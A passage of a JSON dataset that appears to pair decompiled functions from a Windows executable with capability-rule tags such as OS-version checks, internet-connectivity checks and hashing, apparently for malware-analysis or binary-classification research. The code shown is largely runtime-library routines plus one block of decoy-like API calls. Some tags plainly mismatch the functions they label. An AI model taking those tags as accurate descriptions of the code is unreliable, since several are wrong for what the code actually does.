        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040c565(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7b3008 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x7b3ed8;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x7b3ed4 + -1;\n        iVar14 = *0x7b3ed4 + (*0x7b3ed4 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x7b3ed4 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040c6a9;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040c6b0;\ncode_r0x0040c6a9:\n                        do {\n                            bVar6 = true;\ncode_r0x0040c6b0:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040c6be;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040c6be:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x7b3ed0 - *0x7b3ed4) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x7b3ed0 < iVar14) {\n                if (iVar14 < *0x7b3ecc) {\n                    iVar14 = iVar14 + *0x7b3ee0;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x7b3ed8 + (*0x7b3ed8 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x7b3ed8 + (*0x7b3ed8 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x7b3ee0 + *0x7b3ecc;\n                }\n                goto code_r0x0040ca69;\n            }\n            iVar13 = *0x7b3ed0 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x7b3ed4 + -1;\n            iVar13 = *0x7b3ed4 + (*0x7b3ed4 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x7b3ed4 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040c85d;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040c85d:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x7b3ed8 + 1 + (*0x7b3ed8 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040ca69:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x7b3edc == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x7b3edc == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.004044e0(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3291
    },
    "0040cab6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040cd5b)\n// WARNING: Removing unreachable block (ram,0x0040cd24)\n// WARNING: Removing unreachable block (ram,0x0040d10b)\n// WARNING: Removing unreachable block (ram,0x0040cd33)\n// WARNING: Removing unreachable block (ram,0x0040cd3b)\n// WARNING: Removing unreachable block (ram,0x0040cd41)\n// WARNING: Removing unreachable block (ram,0x0040cd44)\n// WARNING: Removing unreachable block (ram,0x0040cd4b)\n// WARNING: Removing unreachable block (ram,0x0040cd55)\n// WARNING: Removing unreachable block (ram,0x0040cdb0)\n// WARNING: Removing unreachable block (ram,0x0040cdaa)\n// WARNING: Removing unreachable block (ram,0x0040cdb6)\n// WARNING: Removing unreachable block (ram,0x0040cdd3)\n// WARNING: Removing unreachable block (ram,0x0040cdd5)\n// WARNING: Removing unreachable block (ram,0x0040cddd)\n// WARNING: Removing unreachable block (ram,0x0040cde0)\n// WARNING: Removing unreachable block (ram,0x0040cde5)\n// WARNING: Removing unreachable block (ram,0x0040cde8)\n// WARNING: Removing unreachable block (ram,0x0040d114)\n// WARNING: Removing unreachable block (ram,0x0040cdf3)\n// WARNING: Removing unreachable block (ram,0x0040d12b)\n// WARNING: Removing unreachable block (ram,0x0040d132)\n// WARNING: Removing unreachable block (ram,0x0040cdfe)\n// WARNING: Removing unreachable block (ram,0x0040ce11)\n// WARNING: Removing unreachable block (ram,0x0040ce13)\n// WARNING: Removing unreachable block (ram,0x0040ce20)\n// WARNING: Removing unreachable block (ram,0x0040ce25)\n// WARNING: Removing unreachable block (ram,0x0040ce2b)\n// WARNING: Removing unreachable block (ram,0x0040ce34)\n// WARNING: Removing unreachable block (ram,0x0040ce3b)\n// WARNING: Removing unreachable block (ram,0x0040ce53)\n// WARNING: Removing unreachable block (ram,0x0040ce63)\n// WARNING: Removing unreachable block (ram,0x0040ce71)\n// WARNING: Removing unreachable block (ram,0x0040ceb1)\n// WARNING: Removing unreachable block (ram,0x0040ceba)\n// WARNING: Removing unreachable block (ram,0x0040d0d1)\n// WARNING: Removing unreachable block (ram,0x0040cec8)\n// WARNING: Removing unreachable block (ram,0x0040ced2)\n// WARNING: Removing unreachable block (ram,0x0040d0ec)\n// WARNING: Removing unreachable block (ram,0x0040cedf)\n// WARNING: Removing unreachable block (ram,0x0040cee6)\n// WARNING: Removing unreachable block (ram,0x0040cef0)\n// WARNING: Removing unreachable block (ram,0x0040cef5)\n// WARNING: Removing unreachable block (ram,0x0040cf05)\n// WARNING: Removing unreachable block (ram,0x0040cf0a)\n// WARNING: Removing unreachable block (ram,0x0040cf14)\n// WARNING: Removing unreachable block (ram,0x0040cf19)\n// WARNING: Removing unreachable block (ram,0x0040cf2b)\n// WARNING: Removing unreachable block (ram,0x0040cf38)\n// WARNING: Removing unreachable block (ram,0x0040cf47)\n// WARNING: Removing unreachable block (ram,0x0040cf54)\n// WARNING: Removing unreachable block (ram,0x0040cf71)\n// WARNING: Removing unreachable block (ram,0x0040cf75)\n// WARNING: Removing unreachable block (ram,0x0040cf7c)\n// WARNING: Removing unreachable block (ram,0x0040cf85)\n// WARNING: Removing unreachable block (ram,0x0040cf88)\n// WARNING: Removing unreachable block (ram,0x0040cf99)\n// WARNING: Removing unreachable block (ram,0x0040cfa8)\n// WARNING: Removing unreachable block (ram,0x0040cfb3)\n// WARNING: Removing unreachable block (ram,0x0040cfba)\n// WARNING: Removing unreachable block (ram,0x0040cfe5)\n// WARNING: Removing unreachable block (ram,0x0040cfea)\n// WARNING: Removing unreachable block (ram,0x0040cff5)\n// WARNING: Removing unreachable block (ram,0x0040cffe)\n// WARNING: Removing unreachable block (ram,0x0040d004)\n// WARNING: Removing unreachable block (ram,0x0040d007)\n// WARNING: Removing unreachable block (ram,0x0040d02d)\n// WARNING: Removing unreachable block (ram,0x0040d032)\n// WARNING: Removing unreachable block (ram,0x0040d037)\n// WARNING: Removing unreachable block (ram,0x0040d042)\n// WARNING: Removing unreachable block (ram,0x0040d053)\n// WARNING: Removing unreachable block (ram,0x0040d084)\n// WARNING: Removing unreachable block (ram,0x0040d059)\n// WARNING: Removing unreachable block (ram,0x0040d07f)\n// WARNING: Removing unreachable block (ram,0x0040d063)\n// WARNING: Removing unreachable block (ram,0x0040d079)\n// WARNING: Removing unreachable block (ram,0x0040d072)\n// WARNING: Removing unreachable block (ram,0x0040d087)\n// WARNING: Removing unreachable block (ram,0x0040d0b4)\n// WARNING: Removing unreachable block (ram,0x0040d091)\n// WARNING: Removing unreachable block (ram,0x0040cf1d)\n// WARNING: Removing unreachable block (ram,0x0040cefa)\n// WARNING: Removing unreachable block (ram,0x0040d0ef)\n// WARNING: Removing unreachable block (ram,0x0040ce36)\n// WARNING: Removing unreachable block (ram,0x0040d0f9)\n// WARNING: Removing unreachable block (ram,0x0040d13a)\n// WARNING: Variable defined which should be unmapped: var_7ch\n\nvoid __cdecl\nfcn.0040cab6(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00405c4a();\n        *puVar2 = 0x16;\n        fcn.00405bf8();\n        fcn.004044e0(var_7ch);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x0040cb3f. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x40d162\n    (**0x40d162)();\n    return;\n}\n",
        "token_count": 1846
    },
    "0040e30b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e30b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x7b3008 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.00407c5b();\n    var_14h = 0;\n    if (*0x7b4f30 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x404394);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x404388), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040e468;\n        *0x7b4f30 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x404378);\n        *0x7b4f34 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x404364);\n        *0x7b4f38 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x404348);\n        *0x7b4f40 = (*pcVar4)(uVar3);\n        if (*0x7b4f40 != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x404330);\n            *0x7b4f3c = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x7b4f3c == var_18h) || (*0x7b4f40 == var_18h)) {\ncode_r0x0040e417:\n        if ((((*0x7b4f34 != var_18h) && (pcVar4 = (*pcVar6)(*0x7b4f34),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x7b4f38 != var_18h && (pcVar4 = (*pcVar6)(*0x7b4f38),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x7b4f3c);\n        pcVar5 = (*pcVar6)(*0x7b4f40);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040e417;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x7b4f30);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040e468:\n    fcn.004044e0(unaff_EBX);\n    return;\n}\n",
        "token_count": 966
    },
    "00406535": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00406535(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "00406ef0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00406ef0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004092b0(0x7b2468, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00405c5d();\n        *puVar2 = 0;\n        puVar2 = fcn.00405c4a();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x3a58944)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x3a58960;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.004091e9(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00405c4a();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00405c5d();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.004067f3(arg_8h_00, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00406fbc();\n                goto code_r0x00406fb3;\n            }\n        }\n        puVar2 = fcn.00405c5d();\n        *puVar2 = 0;\n        puVar2 = fcn.00405c4a();\n        *puVar2 = 9;\n        fcn.00405bf8();\n    }\ncode_r0x00406fb3:\n    fcn.004092f5();\n    return;\n}\n",
        "token_count": 619
    },
    "007b2000": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid fcn.007b2000(void)\n\n{\n    uint in_stack_fffffb98;\n    uchar auStack1116 [68];\n    uchar auStack1048 [12];\n    uchar auStack1036 [1028];\n    uint32_t uStack8;\n    \n    uStack8 = *0x7b3008 ^ &stack0xfffffb98;\n    if (*0x3a57918 == 0xf12) {\n        (*_sym.imp.ADVAPI32.dll_IsValidSecurityDescriptor)(0);\n        (*_sym.imp.KERNEL32.dll_VirtualQuery)(0, &stack0xfffffb94, 0);\n    }\n    *0x7b4fbc = *0x7b4fbc * 0x343fd + 0x269ec3;\n    if (*0x3a57918 == 0x2a5) {\n        (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorDacl)(auStack1036, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_FindActCtxSectionStringW)(0, 0, 0, 0, auStack1116);\n    }\n    if (*0x3a57918 == 0x12cf) {\n        (*_sym.imp.ADVAPI32.dll_RegDeleteValueA)(0, 0);\n        (*_sym.imp.ADVAPI32.dll_ImpersonateNamedPipeClient)(0);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsA)(0, auStack1048, 0);\n        (*_sym.imp.ADVAPI32.dll_CheckTokenMembership)(0, 0, 0);\n    }\n    fcn.004044e0(in_stack_fffffb98);\n    return;\n}\n",
        "token_count": 390
    },
    "004044f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004044f0(uint *arg_8h, uint *arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint uVar9;\n    uint uVar10;\n    uint uVar11;\n    uint uVar12;\n    uint uVar13;\n    uint uVar14;\n    uint uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint *puVar18;\n    \n    if ((arg_ch < arg_8h) && (arg_8h < arg_10h + arg_ch)) {\n        arg_ch = (arg_10h - 4) + arg_ch;\n        puVar18 = (arg_10h - 4) + arg_8h;\n        if ((puVar18 & 3) == 0) {\n            uVar16 = arg_10h >> 2;\n            if (uVar16 < 8) goto code_r0x004046d8;\n            for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + -1;\n                puVar18 = puVar18 + -1;\n            }\n    // switch table (4 cases) at 0x4047fc\n            switch(*((arg_10h & 3) * 4 + 0x4047fc)) {\n            case 0x404814:\ncode_r0x00404814:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                return arg_8h;\n            case 0x404824:\ncode_r0x00404824:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                return arg_8h;\n            case 0x404838:\ncode_r0x00404838:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                *(puVar18 + 1) = *(arg_ch + 1);\n                return arg_8h;\n            }\n        }\n        else if (arg_10h < 4) {\n    // switch table (4 cases) at 0x4047fc\n            switch(*(arg_10h * 4 + 0x4047fc)) {\n            case 0x404814:\n                goto code_r0x00404814;\n            case 0x404824:\n                goto code_r0x00404824;\n            case 0x404838:\n                goto code_r0x00404838;\n            }\n        }\n        else {\n            arg_10h = arg_10h - (puVar18 & 3);\n            switch(*((puVar18 & 3) * 4 + 0x404700)) {\n            case 0x404710:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                arg_ch = arg_ch + -1;\n                uVar16 = arg_10h >> 2;\n                puVar18 = puVar18 - 1;\n                if (uVar16 < 8) {\ncode_r0x004046d8:\n    // WARNING: Could not recover jumptable at 0x004046da. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (1 cases) at 0x4047ac\n                    puVar18 = (**(uVar16 * -4 + 0x4047ac))();\n                    return puVar18;\n                }\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x4047fc)) {\n                case 0x404814:\n                    goto code_r0x00404814;\n                case 0x404824:\n                    goto code_r0x00404824;\n                case 0x404838:\n                    goto code_r0x00404838;\n                }\n                break;\n            case 0x404734:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                uVar16 = arg_10h >> 2;\n                *(puVar18 + 2) = *(arg_ch + 2);\n                arg_ch = arg_ch + -2;\n                puVar18 = puVar18 - 2;\n                if (uVar16 < 8) goto code_r0x004046d8;\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x4047fc)) {\n                case 0x404814:\n                    goto code_r0x00404814;\n                case 0x404824:\n                    goto code_r0x00404824;\n                case 0x404838:\n                    goto code_r0x00404838;\n                }\n                break;\n            case 0x40475c:\n                *(puVar18 + 3) = *(arg_ch + 3);\n                *(puVar18 + 2) = *(arg_ch + 2);\n                uVar16 = arg_10h >> 2;\n                *(puVar18 + 1) = *(arg_ch + 1);\n                arg_ch = arg_ch + -3;\n                puVar18 = puVar18 - 3;\n                if (uVar16 < 8) goto code_r0x004046d8;\n                for (; uVar16 != 0; uVar16 = uVar16 - 1) {\n                    *puVar18 = *arg_ch;\n                    arg_ch = arg_ch + -1;\n                    puVar18 = puVar18 + -1;\n                }\n                switch(*((arg_10h & 3) * 4 + 0x4047fc)) {\n                case 0x404814:\n                    goto code_r0x00404814;\n                case 0x404824:\n                    goto code_r0x00404824;\n                case 0x404838:\n                    goto code_r0x00404838;\n                }\n            }\n        }\n        return arg_8h;\n    }\n    if (((0x7f < arg_10h) && (*0x3a58a68 != 0)) && ((arg_8h & 0xf) == (arg_ch & 0xf))) {\n        puVar18 = arg_8h;\n        if ((arg_ch & 0xf) != 0) {\n            uVar17 = 0x10 - (arg_ch & 0xf);\n            arg_10h = arg_10h - uVar17;\n            for (uVar16 = uVar17 & 3; uVar16 != 0; uVar16 = uVar16 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n            for (uVar17 = uVar17 >> 2; uVar17 != 0; uVar17 = uVar17 - 1) {\n                *puVar18 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                puVar18 = puVar18 + 1;\n            }\n        }\n        for (uVar16 = arg_10h >> 7; uVar16 != 0; uVar16 = uVar16 - 1) {\n            uVar1 = arg_ch[1];\n            uVar2 = arg_ch[2];\n            uVar3 = arg_ch[3];\n            uVar4 = arg_ch[4];\n            uVar5 = arg_ch[5];\n            uVar6 = arg_ch[6];\n            uVar7 = arg_ch[7];\n            uVar8 = arg_ch[8];\n            uVar9 = arg_ch[9];\n            uVar10 = arg_ch[10];\n            uVar11 = arg_ch[0xb];\n            uVar12 = arg_ch[0xc];\n            uVar13 = arg_ch[0xd];\n            uVar14 = arg_ch[0xe];\n            uVar15 = arg_ch[0xf];\n            *puVar18 = *arg_ch;\n            puVar18[1] = uVar1;\n            puVar18[2] = uVar2;\n            puVar18[3] = uVar3;\n            puVar18[4] = uVar4;\n            puVar18[5] = uVar5;\n            puVar18[6] = uVar6;\n            puVar18[7] = uVar7;\n            puVar18[8] = uVar8;\n            puVar18[9] = uVar9;\n            puVar18[10] = uVar10;\n            puVar18[0xb] = uVar11;\n            puVar18[0xc] = uVar12;\n            puVar18[0xd] = uVar13;\n            puVar18[0xe] = uVar14;\n            puVar18[0xf] = uVar15;\n            uVar1 = arg_ch[0x11];\n            